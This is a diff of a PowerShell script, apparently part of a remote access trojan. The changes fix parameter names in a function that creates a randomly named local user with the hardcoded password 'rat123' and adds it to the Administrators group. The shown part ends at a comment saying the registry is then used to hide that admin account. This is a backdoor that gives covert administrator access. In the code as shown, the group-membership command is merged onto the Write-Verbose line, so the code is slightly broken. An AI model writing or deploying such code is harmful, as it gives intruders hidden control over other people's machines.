@@ -22,7 +22,7 @@ function create_account {
      begin {
      }
         process {
-            New-LocalUser "$uname" -pword $pword-FullName "$uname" -Description "Temporary local admin"
+            New-LocalUser "$uname" -password $pword -FullName "$uname" -Description "Temporary local admin"
             Write-Verbose "$uname local user crated" Add-LocalGroupMember -Group "Administrators" -Member "$uname"
             
         }
@@ -34,7 +34,7 @@ function create_account {
 #create admin user
 $uname = random_text
 $pword = (ConvertTo-SecureString "rat123"-AsPlainText -Force)
-create_account  -uname $uname -pword $pword
+create_account  -uname $uname -password $pword
 
 #registry  to hide local admin
 $reg_file = random_text
